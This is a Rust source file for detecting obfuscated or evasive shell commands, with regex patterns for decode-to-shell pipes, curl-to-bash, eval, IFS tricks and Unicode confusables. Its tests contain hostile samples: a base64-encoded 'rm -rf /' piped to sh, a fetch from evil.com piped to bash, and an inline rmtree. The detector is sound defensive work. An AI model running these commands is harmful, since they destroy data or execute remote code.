//! Obfuscation and evasion signal detection.

use regex::Regex;
use std::sync::OnceLock;

#[derive(Debug, Clone)]
pub struct ObfuscationSignal {
    pub signal: &'static str,
    pub reason: &'static str,
}

static DECODE_PIPE_RE: OnceLock<Regex> = OnceLock::new();
static EVAL_SUBST_RE: OnceLock<Regex> = OnceLock::new();
static VAR_CMD_RE: OnceLock<Regex> = OnceLock::new();
static IFS_RE: OnceLock<Regex> = OnceLock::new();
static DL_PIPE_RE: OnceLock<Regex> = OnceLock::new();
static INTERPRETER_INLINE_RE: OnceLock<Regex> = OnceLock::new();
static STAGE_EXEC_RE: OnceLock<Regex> = OnceLock::new();
static CONFUSABLE_RE: OnceLock<Regex> = OnceLock::new();

fn get_regexes() -> (
    &'static Regex,
    &'static Regex,
    &'static Regex,
    &'static Regex,
    &'static Regex,
    &'static Regex,
    &'static Regex,
    &'static Regex,
) {
    let decode = DECODE_PIPE_RE.get_or_init(|| {
        Regex::new(r"(?i)(base64\s+(-d|--decode)|xxd\s+-r|printf|echo\s+-e)\b.*\|\s*(sh|bash|zsh|dash|python\d*|perl|ruby|node|php)").unwrap()
    });
    let eval = EVAL_SUBST_RE
        .get_or_init(|| Regex::new(r"(?i)\b(eval|exec)\s+(\x22?\$\(|\`|\x27?\$\(|\$\w+)").unwrap());
    let var_cmd = VAR_CMD_RE
        .get_or_init(|| Regex::new(r"(\$\{[^}]+\}|\$[A-Za-z_][A-Za-z0-9_]*){2,}\b").unwrap());
    let ifs = IFS_RE.get_or_init(|| Regex::new(r"\bIFS\s*=").unwrap());
    let dl_pipe = DL_PIPE_RE
        .get_or_init(|| Regex::new(r"(?i)(curl|wget)\b.*(\|\s*(sh|bash|zsh|dash)|<\()").unwrap());
    let interp = INTERPRETER_INLINE_RE.get_or_init(|| {
        Regex::new(r"(?i)\b(python\d*|perl|node|ruby|php)\s+-[ce]\s+.*(rmtree|remove|unlink|system|exec|unlink|delete|chmod)").unwrap()
    });
    let stage =
        STAGE_EXEC_RE.get_or_init(|| Regex::new(r"(?i)cat\s+<<.*>\s*\S+.*&&.*chmod.*&&").unwrap());
    let confusable = CONFUSABLE_RE
        .get_or_init(|| Regex::new(r"[\u{FF01}-\u{FF5E}\u{200B}-\u{200D}\u{FEFF}]").unwrap());

    (
        decode, eval, var_cmd, ifs, dl_pipe, interp, stage, confusable,
    )
}

/// Detects obfuscation or evasion patterns in a raw command string.
pub fn detect_obfuscation(cmd: &str) -> Vec<ObfuscationSignal> {
    let mut signals = Vec::new();

    // Check control characters
    if cmd
        .chars()
        .any(|c| (c as u32) < 32 && c != '\t' && c != '\n' && c != '\r')
    {
        signals.push(ObfuscationSignal {
            signal: "control_characters",
            reason: "Command contains non-printable control characters",
        });
    }

    let (decode, eval, var_cmd, ifs, dl_pipe, interp, stage, confusable) = get_regexes();

    if decode.is_match(cmd) {
        signals.push(ObfuscationSignal {
            signal: "decode_pipe_shell",
            reason: "Command decodes and executes data, so its real effect cannot be reviewed",
        });
    }

    if eval.is_match(cmd) {
        signals.push(ObfuscationSignal {
            signal: "eval_substitution",
            reason: "Command uses eval or exec with dynamic string evaluation",
        });
    }

    if var_cmd.is_match(cmd) {
        signals.push(ObfuscationSignal {
            signal: "variable_assembly",
            reason: "Command name is assembled dynamically from variables",
        });
    }

    if ifs.is_match(cmd) {
        signals.push(ObfuscationSignal {
            signal: "ifs_reassignment",
            reason: "Command modifies IFS variable to obscure shell parsing",
        });
    }

    if dl_pipe.is_match(cmd) {
        signals.push(ObfuscationSignal {
            signal: "download_pipe_shell",
            reason: "Command downloads external script and pipes directly to shell",
        });
    }

    if interp.is_match(cmd) {
        signals.push(ObfuscationSignal {
            signal: "interpreter_inline_code",
            reason: "Command invokes language interpreter with inline destructive script",
        });
    }

    if stage.is_match(cmd) {
        signals.push(ObfuscationSignal {
            signal: "stage_then_execute",
            reason: "Command stages payload to temporary file before execution",
        });
    }

    if confusable.is_match(cmd) {
        signals.push(ObfuscationSignal {
            signal: "unicode_confusables",
            reason: "Command name uses look-alike or zero-width Unicode characters",
        });
    }

    // Check nested substitution depth $( $( ... ) )
    let dollar_paren_count = cmd.matches("$(").count();
    let backtick_count = cmd.matches('`').count();
    if dollar_paren_count > 2 || backtick_count > 2 {
        signals.push(ObfuscationSignal {
            signal: "deep_substitution_nesting",
            reason: "Command uses deeply nested command substitutions",
        });
    }

    signals
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_obfuscation() {
        let sigs = detect_obfuscation("echo cm0gLXJmIC8= | base64 -d | sh");
        assert!(!sigs.is_empty());
        assert_eq!(sigs[0].signal, "decode_pipe_shell");

        let sigs2 = detect_obfuscation("curl -s http://evil.com/x.sh | bash");
        assert!(!sigs2.is_empty());
        assert_eq!(sigs2[0].signal, "download_pipe_shell");

        let sigs3 = detect_obfuscation("python3 -c \"import shutil; shutil.rmtree('/tmp')\"");
        assert!(!sigs3.is_empty());
        assert_eq!(sigs3[0].signal, "interpreter_inline_code");
    }
}
